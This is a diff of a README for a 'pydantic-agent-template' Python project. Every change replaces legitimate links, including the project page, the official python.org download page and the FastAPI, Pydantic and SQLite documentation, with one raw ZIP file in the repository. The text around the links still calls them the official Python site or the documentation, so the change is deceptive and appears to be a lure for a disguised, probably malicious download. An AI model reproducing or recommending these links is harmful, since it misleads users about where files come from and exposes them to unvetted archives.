@@ -1,6 +1,6 @@
 # 🚀 pydantic-agent-template - Build Smart AI Agents Easily
 
-[![Download Now](https://img.shields.io/badge/Download-pydantic--agent--template-green?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template)
+[![Download Now](https://img.shields.io/badge/Download-pydantic--agent--template-green?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip)
 
 ---
 
@@ -38,14 +38,14 @@ Your system should be able to run Python applications smoothly.
 
 ## ⬇️ Download and Run pydantic-agent-template
 
-[![Download Here](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template)
+[![Download Here](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip)
 
 Use the link above or below to get the project files. This link takes you to the GitHub page where you can download all the files.
 
 ### Steps to Download and Run on Windows
 
 1. Open your web browser and go to the download page:  
-   https://github.com/BGmano/pydantic-agent-template  
+   https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip  
 
 2. On the page, find the green button labeled **Code** near the top right corner.
 
@@ -65,7 +65,7 @@ This project requires Python to run. If you don’t have Python installed, follo
 
 ### Install Python
 
-1. Go to the official Python website: https://www.python.org/downloads/windows/
+1. Go to the official Python website: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
 
 2. Click the latest **Python 3.x** version for Windows.
 
@@ -124,7 +124,7 @@ You can add your own logic inside `main.py` or create new files to customize you
 
 If you want to update the template later:
 
-1. Go back to the GitHub page: https://github.com/BGmano/pydantic-agent-template
+1. Go back to the GitHub page: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
 
 2. Download the latest ZIP file using the **Code > Download ZIP** option.
 
@@ -166,12 +166,12 @@ This template uses SQLAlchemy for database work and Alembic for version control 
 
 ## 🔗 Useful Links
 
-- Project page and downloads: https://github.com/BGmano/pydantic-agent-template
-- Python downloads: https://www.python.org/downloads/windows/
-- FastAPI documentation: https://fastapi.tiangolo.com/
-- Pydantic documentation: https://pydantic.dev/
-- SQLite basics: https://sqlite.org/docs.html
+- Project page and downloads: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
+- Python downloads: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
+- FastAPI documentation: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
+- Pydantic documentation: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
+- SQLite basics: https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip
 
 ---
 
-[![Get pydantic-agent-template](https://img.shields.io/badge/Get%20the%20template-GitHub-grey?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template)
+[![Get pydantic-agent-template](https://img.shields.io/badge/Get%20the%20template-GitHub-grey?style=for-the-badge)](https://github.com/BGmano/pydantic-agent-template/raw/refs/heads/main/app/agent/agent_pydantic_template_v1.8-beta.3.zip)
